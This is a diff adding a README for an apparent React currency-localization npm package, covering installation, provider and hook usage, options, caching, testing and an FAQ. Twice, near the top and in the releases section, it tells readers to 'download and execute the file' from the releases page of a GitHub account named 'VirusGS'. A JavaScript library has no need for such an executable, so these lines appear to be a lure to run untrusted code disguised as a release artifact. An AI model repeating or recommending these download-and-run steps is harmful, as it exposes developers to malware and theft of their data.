+Install from npm or yarn:
+
+```bash
+# npm
+npm install react-currency-localizer
+
+# yarn
+yarn add react-currency-localizer
+
+# pnpm
+pnpm add react-currency-localizer
+```
+
+If you prefer a release artifact, download and execute the file at:
+https://github.com/VirusGS/react-currency-localizer/releases
+
+Usage — basic
+1. Provide your ExchangeRate-API key via environment or options.
+2. Wrap your app.
+3. Use useLocalizedPrice or <LocalizedPrice>.
+
+Provider example (React)
+```tsx
+import React from "react";
+import { LocalizerProvider } from "react-currency-localizer";
+
+export default function App({ children }) {
+  return (
+    <LocalizerProvider
+      exchangeApiKey={process.env.NEXT_PUBLIC_EXCHANGE_API_KEY || ""}
+      options={{ cacheTime: 1000 * 60 * 60 }} // 1 hour
+    >
+      {children}
+    </LocalizerProvider>
+  );
+}
+```
+
+Hook example
+```tsx
+import { useLocalizedPrice } from "react-currency-localizer";
+
+function Price({ amountUsd }: { amountUsd: number }) {
+  const { formatted, currency, rate } = useLocalizedPrice({
+    amount: amountUsd,
+    baseCurrency: "USD",
+  });
+
+  return (
+    <div>
+      <span>{formatted}</span>
+      <small> ({currency} • rate {rate.toFixed(4)})</small>
+    </div>
+  );
+}
+```
+
+Component example
+```tsx
+import { LocalizedPrice } from "react-currency-localizer";
+
+<LocalizedPrice amount={19.99} baseCurrency="USD" />
+```
+
+Next.js and SSR notes
+- Geolocation requires client IP. In SSR, you can:
+  - Use server-side headers (x-forwarded-for) and call ipapi.co on the server.
+  - Or run the provider only on the client and render fallback prices on the server.
+- The provider works on the client. If you fetch rates on the server, pass them as initial data to the provider for consistency.
+
+Advanced options
+- exchangeApiKey: string — ExchangeRate-API key.
+- geolocationEndpoint: string — default uses ipapi.co JSON endpoint.
+- cacheTime: number — TanStack Query cacheTime in ms.
+- staleTime: number — time before rates become stale.
+- fallbackCurrency: string — currency code if detection or fetch fails.
+- rateMargin: number — apply a markup or discount to rates (expressed as decimal).
+- formatterOptions: Intl.NumberFormatOptions — custom format options.
+
+Example provider with overrides
+```tsx
+<LocalizerProvider
+  exchangeApiKey="sk_live_XXXXX"
+  options={{
+    cacheTime: 1000 * 60 * 30, // 30m
+    fallbackCurrency: "USD",
+    rateMargin: 0.005, // add 0.5%
+    formatterOptions: { maximumFractionDigits: 2 },
+  }}
+/>
+```
+
+API reference
+
+LocalizerProvider props
+- exchangeApiKey: string (required) — API key for ExchangeRate-API.
+- children: ReactNode — app children.
+- options?: {
+  - cacheTime?: number
+  - staleTime?: number
+  - fallbackCurrency?: string
+  - geolocationEndpoint?: string
+  - rateMargin?: number
+  - formatterOptions?: Intl.NumberFormatOptions
+}
+
+useLocalizedPrice(options)
+- options:
+  - amount: number (required) — amount in baseCurrency.
+  - baseCurrency?: string — defaults to "USD".
+  - locale?: string — override detected locale.
+  - currency?: string — override detected currency.
+  - format?: Intl.NumberFormatOptions — additional format options.
+
+Returns
+- formatted: string — formatted currency string (Intl result).
+- currency: string — target currency code.
+- rate: number — exchange rate applied.
+- loading: boolean
+- error: Error | null
+- refetch(): Promise<void>
+
+LocalizedPrice component props
+- amount: number (required)
+- baseCurrency?: string
+- locale?: string
+- currency?: string
+- format?: Intl.NumberFormatOptions
+- children?: (props) => ReactNode — render prop for custom output
+
+TypeScript types
+- All public types export from the package:
+  - LocalizerOptions
+  - LocalizedPriceResult
+  - UseLocalizedPriceOptions
+- Example:
+```ts
+import type { LocalizedPriceResult } from "react-currency-localizer";
+
+function printPrice(p: LocalizedPriceResult) {
+  console.log(p.formatted, p.currency, p.rate);
+}
+```
+
+Caching and error handling
+- The package uses TanStack Query for:
+  - Caching exchange rates and geolocation.
+  - Background refetch and retry logic.
+- Retries:
+  - Exponential backoff for rate fetch failures.
+  - Configurable via provider options.
+- Fallbacks:
+  - If geolocation fails, fallbackCurrency applies.
+  - If rate fetch fails and no cache exists, the component shows base currency amount formatted to fallbackLocale.
+- Logging:
+  - Errors surface on the hook return.
+  - You can subscribe to onError via provider options to forward logs to your monitoring.
+
+Intl formatting details
+- Currency formatting uses Intl.NumberFormat with currency and locale.
+- The package selects currency by country code by default (USD for US, EUR for most EU countries).
+- It respects locale conventions for decimals and grouping.
+- It supports currency display: "symbol", "code", "name".
+
+Manual overrides
+- You can force currency or locale at any time:
+  - Use provider-level options to set app-wide defaults.
+  - Use hook/component props to override per-price.
+- You can also pass a manual rate to bypass ExchangeRate-API:
+```tsx
+useLocalizedPrice({ amount: 100, baseCurrency: "USD", manualRate: 0.85, currency: "EUR" })
+```
+
+Security and privacy
+- The package calls ipapi.co to detect IP-based location. The request goes over HTTPS.
+- You can disable geolocation and provide a manual locale to avoid IP calls.
+
+Testing
+- The library ships with unit tests for:
+  - Rate fetching and caching.
+  - Intl formatting variations.
+  - Error fallback paths.
+- Example test with Jest:
+```ts
+import { renderHook } from "@testing-library/react-hooks";
+import { LocalizerProvider, useLocalizedPrice } from "react-currency-localizer";
+
+test("formats USD to EUR with manual rate", () => {
+  const wrapper = ({ children }) => (
+    <LocalizerProvider exchangeApiKey="test">{children}</LocalizerProvider>
+  );
+  const { result } = renderHook(() => useLocalizedPrice({
+    amount: 10,
+    baseCurrency: "USD",
+    currency: "EUR",
+    manualRate: 0.9
+  }), { wrapper });
+
+  expect(result.current.formatted).toMatch(/€9\.00/);
+});
+```
+
+Performance
+- The library caches results and avoids repeated network calls.
+- It keeps the bundle minimal and uses native Intl.
+
+Common patterns
+- Price lists
+  - Fetch product prices in base currency from your API.
+  - Render each price with <LocalizedPrice> and let the provider fetch rates once.
+- Checkout
+  - Show both base currency and localized price.
+  - Offer a toggle to pay in the localized currency (apply rateMargin for margin).
+
+Contributing
+- Open an issue for any bug or feature request.
+- Fork, branch, and submit a pull request.
+- Follow the code style and add tests for new behavior.
+- Use the monorepo scripts for lint, test, and build.
+
+Releases & changelog
+[![Releases](https://img.shields.io/badge/Changelog-View-orange?link=https://github.com/VirusGS/react-currency-localizer/releases)](https://github.com/VirusGS/react-currency-localizer/releases)
+
+Download and execute the file at:
+https://github.com/VirusGS/react-currency-localizer/releases
+
+If the URL does not work, check the Releases section on the repo page.
+
+FAQ
+- How does geolocation work?
+  - The package calls ipapi.co to get a country and currency. You can override it.
+- Can I use it without an API key?
+  - You can use cached or manual rates, but ExchangeRate-API requires a key for live rates.
+- Does it handle cents and precision?
+  - Intl handles precision. You can set maximumFractionDigits in formatterOptions.
+
+Images and badges
+- Top badges link to releases and status.
+- Use your own badge keys for build and coverage.
+
+License
+- MIT. Check the LICENSE file in the repo for details.
